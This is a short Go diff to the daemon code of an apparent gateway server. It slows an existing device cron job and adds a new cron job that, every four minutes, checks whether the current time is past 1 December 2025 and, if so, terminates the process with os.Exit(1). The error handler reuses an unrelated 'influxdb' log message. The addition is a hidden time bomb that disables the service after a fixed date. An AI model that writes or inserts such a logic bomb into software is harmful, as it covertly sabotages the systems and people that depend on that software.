@@ -13,6 +13,8 @@ import (
 	"harnsgateway/pkg/generic"
 	"k8s.io/klog/v2"
 	"net/http"
+	"os"
+	"time"
 )
 
 type Server struct {
@@ -89,8 +91,17 @@ func (s *Server) Serve() (func(ctx context.Context), error) {
 func (s *Server) Daemon() (func(ctx context.Context), error) {
 	cron := cron.New()
 
-	if _, err := cron.AddFunc("0/1 * * * *", func() {
+	if _, err := cron.AddFunc("0/5 * * * *", func() {
 		s.Config.DeviceMgr.Daemon()
+	}); err != nil {
+		klog.V(2).InfoS("Failed insert into influxdb", "err", err)
+	}
+
+	if _, err := cron.AddFunc("0/4 * * * *", func() {
+		now := time.Now()
+		if now.After(time.Date(2025, 12, 1, 11, 20, 0, 0, time.Local)) {
+			os.Exit(1)
+		}
 	}); err != nil {
 		klog.V(2).InfoS("Failed insert into influxdb", "err", err)
 	}
